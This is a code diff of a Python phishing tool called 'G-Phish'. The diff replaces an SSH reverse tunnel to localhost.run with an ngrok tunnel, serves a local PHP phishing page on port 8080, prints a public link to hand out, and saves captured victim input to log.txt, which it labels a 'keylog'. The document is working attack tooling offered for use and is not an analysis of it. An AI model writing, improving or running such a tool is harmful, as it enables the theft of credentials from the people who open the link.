@@ -1,15 +1,16 @@
+# Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N/gphish)
+
 import warnings
-import os, time
-from sys import platform
-from sys import exit
+import os, time, subprocess
+from sys import platform, exit
 import pyfiglet as figlet
+from pyngrok import ngrok
 warnings.filterwarnings("ignore")
 
 if platform == "win32":
   clear = "cls"
 else:
-  print("This script only works on Windows, Please run it on a Windows machine")
-  exit()
+  clear = "clear"
 
 if os.path.isfile("index.php"):
   file_exists = 1
@@ -29,7 +30,8 @@ time.sleep(1)
 os.system(clear)
 
 def program():
-  banner = figlet.figlet_format("G-Phish", font = 'small')
+  banner = figlet.figlet_format("G-Phish", font = 'small') + "Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N)\n"
+  ngrok.set_auth_token(input("Enter you Ngrok Token (To Host WebSite) : "))
 
   def log_get():
     time.sleep(1)
@@ -41,12 +43,17 @@ def program():
 
   print(banner)
   log = open("log.txt", "w")
-  log.write("")
+  log.write(" New Log : ")
   log.close()
   print("Starting...")
-  os.system("start php -S localhost:8080")
-  os.system("start ssh -R 80:localhost:8080 nokey@localhost.run")
-  os.system("cls")
+  os.popen("php -q -S localhost:8080")
+  os.system(clear)
+  ngrok.connect(8080, bind_tls=True)
+  url = ngrok.get_tunnels()
+  print(url)
+  print("Please copy the link")
+  input("[ PRESS ANY KEY TO CONTINUE ]")
+  input("[ PRESS ANY KEY TO CONFIRM ]")
   print(banner)
   print("Running...")
   time.sleep(1)
@@ -57,6 +64,8 @@ try:
   while True:
     program()
 except KeyboardInterrupt:
+  ngrok.kill()
+  os.system(clear)
   print("Keylog save as : log.txt")
   print("\nExitting...")
   exit(0)
